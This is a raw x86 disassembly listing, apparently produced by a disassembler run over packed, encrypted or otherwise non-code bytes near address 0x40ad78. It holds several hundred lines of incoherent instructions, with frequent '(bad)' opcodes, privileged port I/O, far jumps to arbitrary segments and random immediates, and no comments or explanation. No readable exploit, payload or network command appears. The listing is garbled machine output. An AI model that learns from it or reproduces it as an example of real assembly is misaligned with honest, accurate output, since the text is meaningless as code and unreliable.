  40ad78:	arpl   WORD PTR [edi-0x207312bd],sp
  40ad7e:	mov    al,0xd1
  40ad80:	lods   eax,DWORD PTR ds:[esi]
  40ad81:	shr    BYTE PTR [ecx+0x5],1
  40ad84:	cmp    edi,0xfffffff0
  40ad87:	xchg   ecx,eax
  40ad88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad89:	pop    ss
  40ad8a:	call   0x9bcf0370
  40ad8f:	das    
  40ad90:	shl    al,1
  40ad92:	pop    ecx
  40ad93:	or     al,0x16
  40ad95:	ds lock mov edx,0xd26354a7
  40ad9c:	cmp    eax,0x77e8aa12
  40ada1:	fstp   DWORD PTR [edx+0xa219d9]
  40ada7:	out    0xad,eax
  40ada9:	mov    ecx,0xb4b140d2
  40adae:	or     DWORD PTR [edx-0x72],ebx
  40adb1:	popf   
  40adb2:	or     eax,0x18e3ef13
  40adb7:	xchg   ecx,eax
  40adb8:	repnz test BYTE PTR [ebp-0x12fb76c2],ah
  40adbf:	push   es
  40adc0:	push   edi
  40adc1:	adc    BYTE PTR ds:0x6c42526f,ah
  40adc7:	movntq QWORD PTR [eax],mm7
  40adca:	add    BYTE PTR [esi+0x4a95b688],dl
  40add0:	push   eax
  40add1:	jecxz  0x40ad53
  40add3:	push   0x9925f766
  40add8:	aaa    
  40add9:	cdq    
  40adda:	jno    0x40ad88
  40addc:	stos   BYTE PTR es:[edi],al
  40addd:	inc    ebx
  40adde:	pusha  
  40addf:	in     al,dx
  40ade0:	sar    WORD PTR [edx-0x3b],0xee
  40ade5:	inc    eax
  40ade6:	out    0x37,eax
  40ade8:	int3   
  40ade9:	outs   dx,BYTE PTR ds:[esi]
  40adea:	mov    al,0x15
  40adec:	lods   eax,DWORD PTR ds:[esi]
  40aded:	xchg   edx,eax
  40adee:	out    dx,eax
  40adef:	dec    edi
  40adf0:	push   cs
  40adf1:	arpl   bp,cx
  40adf3:	mov    edi,0x54e3677c
  40adf8:	xchg   ebx,eax
  40adf9:	gs push esi
  40adfb:	fcomip st,st(1)
  40adfd:	loopne 0x40ae1d
  40adff:	loopne 0x40ae3d
  40ae01:	and    bh,BYTE PTR [edi]
  40ae03:	and    eax,0xe7b7b125
  40ae08:	iret   
  40ae09:	adc    BYTE PTR [edi+ecx*8+0x1f2f15c1],al
  40ae10:	mov    DWORD PTR [eax],ebp
  40ae12:	retf   
  40ae13:	jg     0x40ae48
  40ae15:	jne    0x40ae04
  40ae17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae18:	das    
  40ae19:	aad    0x4e
  40ae1b:	dec    esi
  40ae1c:	push   edi
  40ae1d:	pop    esp
  40ae1e:	das    
  40ae1f:	lahf   
  40ae20:	pop    ebp
  40ae21:	call   0x9c8f:0x71e15ce3
  40ae28:	cmp    al,0xcc
  40ae2a:	and    BYTE PTR [ebx+0x5b094a4f],dh
  40ae30:	jne    0x40ae0c
  40ae32:	cmp    eax,0x32f8f447
  40ae37:	pop    ebp
  40ae38:	outs   dx,DWORD PTR ds:[esi]
  40ae39:	push   ebp
  40ae3a:	loopne 0x40aea4
  40ae3c:	mov    cl,BYTE PTR [eax+0x69c38fb0]
  40ae42:	and    ebp,DWORD PTR [eax+ebx*2-0x3770ab07]
  40ae49:	sub    eax,0xd4941d7d
  40ae4e:	mov    bh,0x7e
  40ae50:	push   ds
  40ae51:	sub    eax,0xf51070e1
  40ae56:	dec    esp
  40ae57:	mov    BYTE PTR [ecx+edx*1+0x1cca6556],dl
  40ae5e:	fild   DWORD PTR [ebx-0x15694127]
  40ae64:	das    
  40ae65:	jmp    0xc68f:0x289cdd08
  40ae6c:	mov    cl,0xd9
  40ae6e:	jp     0x40aeeb
  40ae70:	and    al,0x9b
  40ae72:	addr16 (bad) 
  40ae74:	out    dx,al
  40ae75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae76:	bndldx bnd2,[eax-0x1456d809]
  40ae7d:	rcr    DWORD PTR [ecx+ebp*2],cl
  40ae80:	shr    BYTE PTR [ebp-0x5eee8853],1
  40ae86:	adc    ebp,esi
  40ae88:	inc    edi
  40ae89:	mov    ecx,0x74a773f7
  40ae8e:	ret    
  40ae8f:	ins    BYTE PTR es:[edi],dx
  40ae90:	xchg   esp,esi
  40ae92:	add    al,BYTE PTR [edx]
  40ae94:	test   al,0xc7
  40ae96:	sub    DWORD PTR [edx+0x13],0xffffff8d
  40ae9a:	fidivr WORD PTR [ebx-0x28a95e67]
  40aea0:	jmp    0x40af0f
  40aea2:	xchg   DWORD PTR [edx],edi
  40aea4:	dec    edi
  40aea5:	fwait
  40aea6:	or     DWORD PTR [edi+ebx*1],ecx
  40aea9:	stc    
  40aeaa:	(bad)  
  40aeab:	cmp    bl,bl
  40aead:	xchg   ecx,eax
  40aeae:	outs   dx,DWORD PTR ds:[esi]
  40aeaf:	ror    DWORD PTR [eax+0x15017344],cl
  40aeb5:	mov    edi,0x83ad20cb
  40aeba:	into   
  40aebb:	out    0xa2,al
  40aebd:	pushf  
  40aebe:	cmp    BYTE PTR [edi+0x1f41bd79],ch
  40aec4:	fild   QWORD PTR [ebx-0x25]
  40aec7:	and    al,0xde
  40aec9:	jge    0x40aeb7
  40aecb:	nop
  40aecc:	mov    al,BYTE PTR [eax+0x459689d8]
  40aed2:	push   esp
  40aed3:	in     al,dx
  40aed4:	inc    edx
  40aed5:	data16 jno 0x40af39
  40aed8:	xor    al,0x8c
  40aeda:	jmp    0xfdd1f638
  40aedf:	stos   BYTE PTR es:[edi],al
  40aee0:	push   0xffffffd0
  40aee2:	test   eax,0x8affd7f5
  40aee7:	jo     0x40aecb
  40aee9:	stos   DWORD PTR es:[edi],eax
  40aeea:	pop    edx
  40aeeb:	cwde   
  40aeec:	mov    ebx,0x9101ff0b
  40aef1:	pop    ecx
  40aef2:	jle    0x40af43
  40aef4:	loope  0x40af34
  40aef6:	mov    al,ds:0xd43b0190
  40aefb:	cs (bad) 
  40aefd:	je     0x40af3c
  40aeff:	inc    ebx
  40af00:	call   0x72130b23
  40af05:	es (bad) 
  40af08:	dec    ebp
  40af09:	inc    eax
  40af0a:	(bad)  
  40af0b:	sub    DWORD PTR [ebp+0x56],esp
  40af0e:	aad    0x8a
  40af10:	mov    ah,0xa4
  40af12:	jo     0x40ae94
  40af14:	outs   dx,DWORD PTR ds:[esi]
  40af15:	push   0xad8739d
  40af1a:	outs   dx,DWORD PTR ds:[esi]
  40af1b:	or     BYTE PTR [ebx+0x7f0bc152],0xc9
  40af22:	mov    WORD PTR [eax],gs
  40af24:	mov    ?,esp
  40af26:	mov    al,0x8
  40af28:	clc    
  40af29:	sbb    al,0x8b
  40af2b:	pop    ecx
  40af2c:	(bad)  
  40af2d:	aam    0x56
  40af2f:	mov    BYTE PTR ds:0x27cb5a81,cl
  40af35:	jmp    0xb89b:0xc6f5d6c0
  40af3c:	inc    edx
  40af3d:	sbb    al,0xed
  40af3f:	cmc    
  40af40:	mov    dh,0xfe
  40af42:	call   0xe817:0x32b598fa
  40af49:	repnz aaa 
  40af4b:	inc    esi
  40af4c:	sub    ecx,DWORD PTR [esi-0x60634fc]
  40af52:	push   0x6
  40af54:	aaa    
  40af55:	in     eax,0x20
  40af57:	dec    edx
  40af58:	mov    ch,0xf4
  40af5a:	sub    al,0x17
  40af5c:	mov    dl,0x7c
  40af5e:	adc    ch,0xfb
  40af61:	jle    0x40af6f
  40af63:	mov    bh,0x5a
  40af65:	mov    al,0x1d
  40af67:	mov    al,ds:0x7be215f9
  40af6c:	add    bl,bl
  40af6e:	dec    esi
  40af6f:	and    al,0x8f
  40af71:	mov    ebp,0xde11ddee
  40af76:	fistp  WORD PTR [edi-0x2]
  40af79:	and    esp,DWORD PTR [ebp-0x44946ccc]
  40af7f:	(bad)  
  40af80:	cmc    
  40af81:	std    
  40af82:	sub    al,BYTE PTR [edx+0x3f]
  40af85:	mov    edx,0xaafd1b8e
  40af8a:	scas   al,BYTE PTR es:[edi]
  40af8b:	adc    BYTE PTR [eax+0x7a],dh
  40af8e:	xor    DWORD PTR [esp+ebx*2+0x67d332b1],ebx
  40af95:	outs   dx,BYTE PTR ds:[esi]
  40af96:	and    esi,DWORD PTR [edx-0x71da54ac]
  40af9c:	ficom  DWORD PTR [edi]
  40af9e:	loopne 0x40af79
  40afa0:	fs enter 0x5a46,0x62
  40afa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa6:	repz push ebx
  40afa8:	leave  
  40afa9:	ins    BYTE PTR es:[edi],dx
  40afaa:	jmp    FWORD PTR [eax+0x2ef894cb]
  40afb0:	mov    dl,0x14
  40afb2:	inc    ebx
  40afb3:	fs fs cmc 
  40afb6:	inc    eax
  40afb7:	cli    
  40afb8:	cmc    
  40afb9:	mov    ds:0xf353289f,eax
  40afbe:	stos   DWORD PTR es:[edi],eax
  40afbf:	jae    0x40af69
  40afc1:	pop    ds
  40afc2:	xchg   edx,eax
  40afc3:	(bad)  
  40afc4:	fstp   DWORD PTR [edi+0x5b]
  40afc7:	int3   
  40afc8:	leave  
  40afc9:	mov    edx,0xf8cb18a6
  40afce:	or     eax,eax
  40afd0:	sti    
  40afd1:	mov    al,0xe7
  40afd3:	or     BYTE PTR [ebx],0xb
  40afd6:	mov    dl,0xe6
  40afd8:	mov    ds:0x1fd6ac3f,al
  40afdd:	mov    edx,0xc281d410
  40afe2:	fcom   QWORD PTR [ebx-0x3d]
  40afe5:	and    BYTE PTR [ebp-0x4c],dh
  40afe8:	dec    ebp
  40afe9:	mul    dl
  40afeb:	ret    
  40afec:	push   ebp
  40afed:	repz sbb edx,DWORD PTR [ebx-0x54]
  40aff1:	and    eax,0xb72bc1e3
  40aff6:	cmp    ebx,edx
  40aff8:	js     0x40b008
  40affa:	dec    ecx
  40affb:	sub    cl,BYTE PTR [esi-0x4e]
  40affe:	and    eax,0xb430b74f
  40b003:	jmp    0x40afc5
  40b005:	push   esi
  40b006:	mov    al,ds:0xccdc20d2
  40b00b:	pop    esp
  40b00c:	jmp    0x40b067
  40b00e:	retf   
  40b00f:	jmp    0xcb0fa93
  40b014:	mov    ah,0xdf
  40b016:	call   0x2ca3542b
  40b01b:	fistp  WORD PTR [ecx-0x655a2f04]
  40b021:	test   eax,0x4a07f857
  40b026:	dec    eax
  40b027:	push   edi
  40b028:	mov    edx,0x44e3190d
  40b02d:	popf   
  40b02e:	call   0x23cc:0xece19fb6
  40b035:	int    0x92
  40b037:	or     esi,0x9caed6c0
  40b03d:	xchg   DWORD PTR [esi],esi
  40b03f:	mov    dh,0x85
  40b041:	bound  esi,QWORD PTR [ebx]
  40b043:	jecxz  0x40b05a
  40b045:	pop    ds
  40b046:	mov    al,0x32
  40b048:	push   edi
  40b049:	push   0x79
  40b04b:	inc    edx
  40b04c:	xchg   edx,eax
  40b04d:	sbb    eax,0x903c70e9
  40b052:	jg     0x40b03b
  40b054:	in     al,0x66
  40b056:	gs ja  0x40afe4
  40b059:	ja     0x40b03b
  40b05b:	mov    ecx,0x6e9b9579
  40b060:	jmp    0x5164:0xcce607b3
  40b067:	retf   
  40b068:	jmp    0x95c0:0x6f6fd80a
  40b06f:	stc    
  40b070:	add    DWORD PTR [ebp+0xa12a7c6],0x0
  40b077:	fiadd  WORD PTR [ebx+0x3e]
  40b07a:	cmp    BYTE PTR [edx+0x1f],al
  40b07d:	in     al,0x68
  40b07f:	sahf   
  40b080:	(bad)  
  40b082:	inc    ebp
  40b083:	sti    
  40b084:	ss ror bh,1
  40b087:	jbe    0x40b072
  40b089:	scas   eax,DWORD PTR es:[edi]
  40b08a:	jp     0x40b0bb
  40b08c:	xor    ch,ah
  40b08e:	sbb    edx,DWORD PTR [ebx-0x49bb3dd1]
  40b094:	enter  0x2198,0x6d
  40b098:	mov    ds:0x25bb9df6,eax
  40b09d:	dec    edi
  40b09e:	jecxz  0x40b0a9
  40b0a0:	scas   eax,DWORD PTR es:[edi]
  40b0a1:	pop    es
  40b0a2:	mov    esp,0x3393133f
  40b0a7:	push   ds
  40b0a8:	out    0xb3,eax
  40b0aa:	xor    al,0x49
  40b0ac:	cmp    ch,ch
  40b0ae:	mov    edx,0x1d1384b8
  40b0b3:	push   ebp
  40b0b4:	sbb    al,0x5d
  40b0b6:	inc    eax
  40b0b7:	mov    cl,0xf
  40b0b9:	dec    eax
  40b0ba:	sub    dh,al
  40b0bc:	cmp    cl,bl
  40b0be:	or     al,0x59
  40b0c0:	into   
  40b0c1:	adc    DWORD PTR [eax-0x13cb2a4c],ecx
  40b0c7:	pop    ebx
  40b0c8:	jmp    0x68afba13
  40b0cd:	mov    edi,ss
  40b0cf:	daa    
  40b0d0:	sub    DWORD PTR [eax+0x16ad5478],ecx
  40b0d6:	loope  0x40b131
  40b0d8:	push   es
  40b0d9:	in     eax,dx
  40b0da:	sbb    al,0x8c
  40b0dc:	and    al,0x55
  40b0de:	imul   ebx,edi,0x123183fc
  40b0e4:	dec    esi
  40b0e5:	dec    ebx
  40b0e6:	imul   esi,DWORD PTR [edi+0xbbeab04],0xc7dd8f53
  40b0f0:	mov    ebp,0x64cba6dd
  40b0f5:	repnz xchg ebp,eax
  40b0f7:	mov    WORD PTR [esi-0x4c7781c7],?
  40b0fd:	sahf   
  40b0fe:	xor    ecx,DWORD PTR ds:0xa0adb13
  40b104:	pop    ebx
  40b105:	adc    al,BYTE PTR [edi-0x7083172f]
  40b10b:	sbb    eax,0xb9fbb35f
  40b110:	sub    eax,0xdafd49ef
  40b115:	or     BYTE PTR [edi],ch
  40b117:	mov    DWORD PTR [ecx+ebp*4],ebx
  40b11a:	imul   edx,DWORD PTR [ecx-0x1847993e],0xb0b17446
  40b124:	shl    BYTE PTR [edx+0x38f316d2],1
  40b12a:	push   esp
  40b12b:	xchg   BYTE PTR [edx],bh
  40b12d:	cmp    DWORD PTR [ebp+0x5eb33415],edx
  40b133:	jle    0x40b13b
  40b135:	cdq    
  40b136:	call   FWORD PTR [edi+ebp*1-0x1732ba37]
  40b13d:	mov    edx,esp
  40b13f:	jae    0x40b170
  40b141:	fcmovne st,st(6)
  40b143:	dec    esp
  40b144:	mov    ds:0x1db42932,eax
  40b149:	xchg   ecx,eax
  40b14a:	test   DWORD PTR [ecx-0x18],0xb0c3915d
  40b151:	repz xchg ecx,eax
  40b153:	bound  edi,QWORD PTR [ecx+0x44790e52]
  40b159:	ins    BYTE PTR es:[edi],dx
  40b15a:	pop    edx
  40b15b:	xchg   esp,eax
  40b15c:	inc    ecx
  40b15d:	xchg   BYTE PTR [esi],ah
  40b15f:	add    eax,0xee5eab28
  40b164:	in     eax,dx
  40b165:	jne    0x40b171
  40b167:	popf   
  40b168:	mov    DWORD PTR [ebp+0x7fdff9e9],edi
  40b16e:	or     DWORD PTR [esi-0x7e448583],edx
  40b174:	enter  0xd60e,0xfe
  40b178:	or     ecx,DWORD PTR [eax]
  40b17a:	gs test cl,dh
  40b17d:	lea    ebx,[ecx+0x12a02710]
  40b183:	imul   esp,ecx,0x46
  40b186:	lds    edx,FWORD PTR [edi+0x56]
  40b189:	jne    0x40b187
  40b18b:	(bad)  
  40b18c:	pop    esi
  40b18d:	xchg   esi,eax
  40b18e:	sub    bh,cl
  40b190:	sti    
  40b191:	cmp    al,0x61
  40b193:	lds    ebx,FWORD PTR [esp+edi*8-0x20aa989]
  40b19a:	mov    bl,0xf3
  40b19c:	repz dec ecx
  40b19e:	sbb    ebx,DWORD PTR [ecx]
  40b1a0:	xchg   DWORD PTR [eax-0x58],esi
  40b1a3:	inc    esp
  40b1a4:	dec    edi
  40b1a5:	(bad)  
  40b1a7:	mov    bl,0x58
  40b1a9:	(bad)  
  40b1aa:	aad    0x65
  40b1ac:	mov    ah,BYTE PTR [ecx+0x540ccf2a]
  40b1b2:	push   ecx
  40b1b3:	pop    ds
  40b1b4:	or     al,0x8
  40b1b6:	ret    
  40b1b7:	pop    es
  40b1b8:	aad    0x9a
  40b1ba:	call   0x2606f71a
  40b1bf:	jno    0x40b1a2
  40b1c1:	call   0x68b17991
  40b1c6:	popf   
  40b1c7:	loope  0x40b20d
  40b1c9:	test   DWORD PTR ds:0xf4bd67d2,ecx
  40b1cf:	inc    edi
  40b1d0:	lea    edi,[esi]
  40b1d2:	and    dl,BYTE PTR fs:[esi+eax*4+0x50]
  40b1d7:	daa    
  40b1d8:	dec    esi
  40b1d9:	add    ebx,DWORD PTR [edi]
  40b1db:	cld    
  40b1dc:	sar    BYTE PTR [edi+0x6288549d],1
  40b1e2:	push   es
  40b1e3:	fdiv   DWORD PTR [edx+0x6d]
  40b1e6:	jg     0x40b169
  40b1e8:	xchg   ebx,eax
  40b1e9:	retf   0xbaf3
  40b1ec:	jnp    0x40b209
  40b1ee:	or     edi,ebp
  40b1f0:	fld    QWORD PTR [ebx+edi*2-0x40]
  40b1f4:	popa   
  40b1f5:	fs pop edx
  40b1f7:	pop    eax
  40b1f8:	xchg   BYTE PTR [ebx-0xb],ch
  40b1fb:	ss std 
  40b1fd:	fnstenv [ecx+ecx*1-0x26]
  40b201:	dec    BYTE PTR ds:0x72dd983a
  40b207:	call   0xf2fe1576
  40b20c:	in     eax,0xbf
  40b20e:	dec    esi
  40b20f:	hlt    
  40b210:	test   DWORD PTR [ebx+0x9561db3],eax
  40b216:	ins    DWORD PTR es:[edi],dx
  40b217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b218:	mov    dh,0xa9
  40b21a:	test   eax,0x132cb071
  40b21f:	mov    esi,0x59d4a0dc
  40b224:	lods   eax,DWORD PTR ds:[esi]
  40b225:	mov    bl,0xb5
  40b227:	dec    edi
  40b228:	mov    ss,WORD PTR [edx+0x62]
  40b22b:	mov    edx,0x21b73f58
  40b230:	add    ecx,DWORD PTR gs:[ecx-0x5ed70346]
  40b237:	jo     0x40b1df
  40b239:	nop
  40b23a:	xor    cl,bh
  40b23c:	in     al,dx
  40b23d:	sar    dh,0x37
  40b240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b241:	mov    ds:0x60092c1b,al
  40b246:	adc    ch,al
  40b248:	cmp    BYTE PTR [edx],0x8b
  40b24b:	dec    esi
  40b24c:	sti    
  40b24d:	lods   eax,DWORD PTR ds:[esi]
  40b24e:	and    bl,cl
  40b250:	test   ecx,eax
  40b252:	lods   eax,DWORD PTR ds:[esi]
  40b253:	add    al,0xda
  40b255:	pop    edx
  40b256:	xchg   ebx,eax
  40b257:	add    eax,DWORD PTR [esi]
  40b259:	inc    edx
  40b25a:	cmp    eax,0xad9a88d5
  40b25f:	leave  
  40b260:	ficomp WORD PTR [ebp+0x2143297a]
  40b266:	fsubr  DWORD PTR [ebp+0x1d816d65]
  40b26c:	dec    esp
  40b26d:	sub    al,0xe1
  40b26f:	lock je 0x40b206
  40b272:	fadd   QWORD PTR [ebp+0x35]
  40b275:	std    
  40b276:	or     DWORD PTR [esi-0x6bd91168],esp
  40b27c:	xchg   ebp,eax
  40b27d:	shl    DWORD PTR [eax+0x79],1
  40b280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b281:	retf   0x6c58
  40b284:	dec    esi
  40b285:	mov    edx,ecx
  40b287:	(bad)  
  40b288:	jmp    0x5fd4:0xba59021a
  40b28f:	or     BYTE PTR [ebx],ah
  40b291:	not    BYTE PTR [esi]
  40b293:	xchg   BYTE PTR [ecx+0x72d7cd16],bl
  40b299:	xchg   edi,eax
  40b29a:	push   ecx
  40b29b:	mov    eax,0x27f40687
  40b2a0:	sub    eax,0x57
  40b2a3:	add    al,0x2e
  40b2a5:	cld    
  40b2a6:	xchg   BYTE PTR [esi],ah
  40b2a8:	pusha  
  40b2a9:	stos   BYTE PTR es:[edi],al
  40b2aa:	add    ecx,DWORD PTR [esp+ecx*1+0x51]
  40b2ae:	das    
  40b2af:	jg     0x40b259
  40b2b1:	and    BYTE PTR [eax],ch
  40b2b3:	lahf   
  40b2b4:	or     ebx,DWORD PTR [eax]
  40b2b6:	pop    ebp
  40b2b7:	in     eax,dx
  40b2b8:	shl    BYTE PTR [edx-0x57],1
  40b2bb:	retf   
  40b2bc:	mov    esp,0xf0dfc343
  40b2c1:	jecxz  0x40b25e
  40b2c3:	or     BYTE PTR [ecx],0x43
  40b2c6:	div    BYTE PTR [eax]
  40b2c8:	sahf   
  40b2c9:	popf   
  40b2ca:	scas   eax,DWORD PTR es:[edi]
  40b2cb:	push   0xffffff9b
  40b2cd:	dec    edx
  40b2ce:	mov    esp,0x74f80882
  40b2d3:	pop    eax
  40b2d4:	lods   eax,DWORD PTR ds:[esi]
  40b2d5:	loope  0x40b2e9
  40b2d7:	push   esp
  40b2d8:	and    eax,0xd372d556
  40b2dd:	xor    DWORD PTR [eax],ecx
  40b2df:	mov    bl,0x58
  40b2e1:	mov    dh,0xd2
  40b2e3:	sti    
  40b2e4:	mov    ebp,0xe6c5a869
  40b2e9:	pop    ds
  40b2ea:	pop    es
  40b2eb:	or     BYTE PTR [ebx-0x674e237d],0xc5
  40b2f2:	shl    DWORD PTR [edx+0x7f],1
  40b2f5:	cmp    al,0x2b
  40b2f7:	jmp    0xf461eb99
  40b2fc:	push   ds
  40b2fd:	xchg   ecx,eax
  40b2fe:	in     al,0x4c
  40b300:	scas   al,BYTE PTR es:[edi]
  40b301:	fs mov ebp,0x692c1a89
  40b307:	mov    edx,0x212edc34
  40b30c:	or     esp,esp
  40b30e:	outs   dx,BYTE PTR ds:[esi]
  40b30f:	adc    eax,0xefb01e1a
  40b314:	dec    ecx
  40b315:	xchg   ebx,eax
  40b316:	sbb    ebp,DWORD PTR [eax+0x69]
  40b319:	push   0x79e3464d
  40b31e:	adc    dh,BYTE PTR [edx-0x55]
  40b321:	mov    edi,0x3d6faebb
  40b326:	xchg   BYTE PTR [ebx-0x2b349ff5],ch
  40b32c:	je     0x40b302
  40b32e:	adc    al,0x54
  40b330:	test   edi,0x4b2efd37
  40b336:	pop    ebp
  40b337:	(bad)  
  40b338:	cmp    DWORD PTR [ebx],esi
  40b33a:	pop    eax
  40b33b:	pop    esi
  40b33c:	mov    al,BYTE PTR [edi-0x77]
  40b33f:	push   ebp
  40b340:	jge    0x40b302
  40b342:	sbb    eax,0x63f180af
  40b347:	(bad)  
  40b349:	and    bp,di
  40b34c:	test   al,0x5f
  40b34e:	push   edi
  40b34f:	add    ecx,DWORD PTR [ebx+0x5632c90f]
  40b355:	mov    ds:0x97e4eab2,al
  40b35a:	xchg   esp,eax
  40b35b:	sti    
  40b35c:	sub    ebp,DWORD PTR [edx+0x57]
  40b35f:	scas   eax,DWORD PTR es:[edi]
  40b360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b361:	enter  0x3a75,0xb7
  40b365:	ds push esp
  40b367:	sbb    esi,0xdd96fb6e
  40b36d:	pop    es
  40b36e:	add    eax,0x62506b69
  40b373:	imul   BYTE PTR [ecx+eax*2+0x1f]
  40b377:	loope  0x40b337
  40b379:	adc    BYTE PTR [edi+0x4b],dl
  40b37c:	push   esi
  40b37d:	jnp    0x40b3cc
  40b37f:	clc    
  40b380:	cmp    eax,0xbce8a05a
  40b385:	xor    BYTE PTR [esi+0x5a],bh
  40b388:	pop    ecx
  40b389:	std    
  40b38a:	loopne 0x40b3f3
  40b38c:	xchg   DWORD PTR [esi+esi*1-0x4c],esi
  40b390:	ins    BYTE PTR es:[edi],dx
  40b391:	shr    BYTE PTR [edi],1
  40b393:	mov    DWORD PTR gs:[ecx-0x67],ecx
  40b397:	mov    ?,WORD PTR [ebx+0x3ffd0866]
  40b39d:	(bad)  
  40b39e:	pop    ebx
  40b39f:	dec    edi
  40b3a0:	(bad)  
  40b3a1:	jne    0x40b368
  40b3a3:	scas   al,BYTE PTR es:[edi]
  40b3a4:	sahf   
  40b3a5:	mov    al,0xec
  40b3a7:	jl     0x40b357
  40b3a9:	mov    al,ds:0xda30b53
  40b3ae:	add    al,0xc
  40b3b0:	int    0x12
  40b3b2:	cmp    eax,0xb92c6e7b
  40b3b7:	sahf   
  40b3b8:	and    cl,ah
  40b3ba:	mov    al,ds:0xf3c00c3d
  40b3bf:	jg     0x40b417
  40b3c1:	call   FWORD PTR [ebx+0x4e85a103]
  40b3c7:	inc    ebp
  40b3c8:	jmp    0xa02b:0x6be7af4
  40b3cf:	shr    BYTE PTR [ebx+0x517552e4],0x98
  40b3d6:	push   0x4603c065
  40b3db:	push   es
  40b3dc:	xchg   BYTE PTR [esi+0x42447928],al
  40b3e2:	int3   
  40b3e3:	push   ss
  40b3e4:	cmp    al,0x1d
  40b3e6:	scas   eax,DWORD PTR es:[edi]
  40b3e7:	inc    ebp
  40b3e8:	fs mov eax,0xf0db4770
  40b3ee:	fcos   
  40b3f0:	fdivp  st(4),st
  40b3f2:	cli    
  40b3f3:	or     al,0x77
  40b3f5:	retf   0x437a
  40b3f8:	mov    edx,0xab4b7c7e
  40b3fd:	ds mov bl,0x1a
  40b400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b401:	gs sahf 
  40b403:	(bad)  
  40b404:	stc    
  40b405:	pop    ebp
  40b406:	mov    dh,0xa
  40b408:	pop    esi
  40b409:	repnz xlat BYTE PTR ds:[ebx]
  40b40b:	mov    eax,0x775564ac
  40b410:	into   
  40b411:	repnz hlt 
  40b413:	ret    
  40b414:	pop    es
  40b415:	xchg   BYTE PTR [ecx-0x717d0615],al
  40b41b:	out    0x37,al
  40b41d:	sub    bl,BYTE PTR [ebx+0x7a]
  40b420:	inc    ecx
  40b421:	out    dx,eax
  40b422:	inc    ebx
  40b423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b424:	out    0x74,eax
  40b426:	mov    DWORD PTR [ebx],eax
  40b428:	mov    ebx,0xe944eaa3
  40b42d:	xor    BYTE PTR [ebx-0x6fc0577d],0xb7
  40b434:	mov    bh,0x9c
  40b436:	rol    DWORD PTR [ebx-0xf84f9bf],0x21
  40b43d:	daa    
  40b43e:	jne    0x40b3d0
  40b440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b441:	jnp    0x40b3cc
  40b443:	jno    0x40b47a
  40b445:	in     al,dx
  40b446:	stos   DWORD PTR es:[edi],eax
  40b447:	cs xchg ecx,eax
  40b449:	dec    eax
  40b44a:	es clc 
  40b44c:	add    ecx,esp
  40b44e:	fbld   TBYTE PTR [edx-0x7806f237]
  40b454:	jo     0x40b43b
  40b456:	bound  esp,QWORD PTR [ecx]
  40b458:	pop    ss
  40b459:	lock (bad) [edx-0x67]
  40b45d:	ja     0x40b485
  40b45f:	retf   
  40b460:	js     0x40b3fa
  40b462:	jl     0x40b4e2
  40b464:	lahf   
  40b465:	and    eax,0xceed7189
  40b46a:	fdivr  DWORD PTR [esi]
  40b46c:	mov    ds:0x91ef5f5f,al
  40b471:	popf   
  40b472:	std    
  40b473:	jbe    0x40b49e
  40b475:	retf   
  40b476:	(bad)  
  40b477:	addr16 adc eax,0x2f34b246
  40b47d:	pop    esp
  40b47e:	packuswb mm3,mm4
  40b481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b482:	lahf   
  40b483:	mov    ch,0x6e
  40b485:	jmp    0x40b492
  40b487:	sub    al,0xb
  40b489:	add    DWORD PTR ds:0xa1e5a517,edx
  40b48f:	dec    ebp
  40b490:	aam    0x25
  40b492:	jge    0x40b4ee
  40b494:	pop    edx
  40b495:	push   ebx
  40b496:	scas   eax,DWORD PTR es:[edi]
  40b497:	clc    
  40b498:	cmp    eax,0x22cbadd4
  40b49d:	popa   
  40b49e:	push   0x79561601
  40b4a3:	add    DWORD PTR ds:0xac1598b0,esp
  40b4a9:	aam    0x84
  40b4ab:	in     al,dx
  40b4ac:	stc    
  40b4ad:	cmp    bh,BYTE PTR [edx]
  40b4af:	jnp    0x40b48f
  40b4b1:	pop    edx
  40b4b2:	dec    ebx
  40b4b3:	loope  0x40b503
  40b4b5:	cmovae ebx,edi
  40b4b8:	mov    edi,0x64c9ea5a
  40b4bd:	or     dh,dl
  40b4bf:	mov    bl,0x2a
  40b4c1:	lea    esi,[edx+0x58867ed1]
  40b4c7:	lea    edx,[edx+0x14]
  40b4ca:	push   ss
  40b4cb:	icebp  
  40b4cc:	push   ss
  40b4cd:	mov    edx,0x72af4610
  40b4d2:	out    dx,eax
  40b4d3:	add    BYTE PTR [ebp-0x6b],ch
  40b4d6:	test   eax,0x21c10ec
  40b4db:	sub    ebx,DWORD PTR [edi+0x2e]
  40b4de:	mov    esp,0x9c7afa77
  40b4e3:	push   es
  40b4e4:	sub    BYTE PTR [edx+0x33798bee],ah
  40b4ea:	(bad)  
  40b4eb:	loopne 0x40b4f4
  40b4ed:	repz mov ch,0xc3
  40b4f0:	ins    BYTE PTR es:[edi],dx
  40b4f1:	(bad)  
  40b4f2:	out    0x95,eax
  40b4f4:	loope  0x40b4c7
  40b4f6:	cwde   
  40b4f7:	mov    WORD PTR ds:0x14b27e79,cs
  40b4fd:	call   0x3597:0xd74a18c1
  40b504:	push   esi
  40b505:	adc    DWORD PTR [ebp-0x4615f5c3],esi
  40b50b:	data16 mov bl,bl
  40b50e:	jb     0x40b534
  40b510:	inc    ebp
  40b511:	push   eax
  40b512:	push   ebx
  40b513:	cld    
  40b514:	mov    ah,0xd7
  40b516:	inc    ebx
  40b517:	call   0x80df61cc
  40b51c:	mov    ah,0xc6
  40b51e:	sbb    al,0x79
  40b520:	sbb    DWORD PTR [ebp-0x4e],edx
  40b523:	fs dec esi
  40b525:	dec    esp
  40b526:	xor    ch,BYTE PTR [ebp-0x40]
  40b529:	outs   dx,BYTE PTR ds:[esi]
  40b52a:	pop    edi
  40b52b:	jo     0x40b56d
  40b52d:	mov    dh,0x64
  40b52f:	jnp    0x40b56c
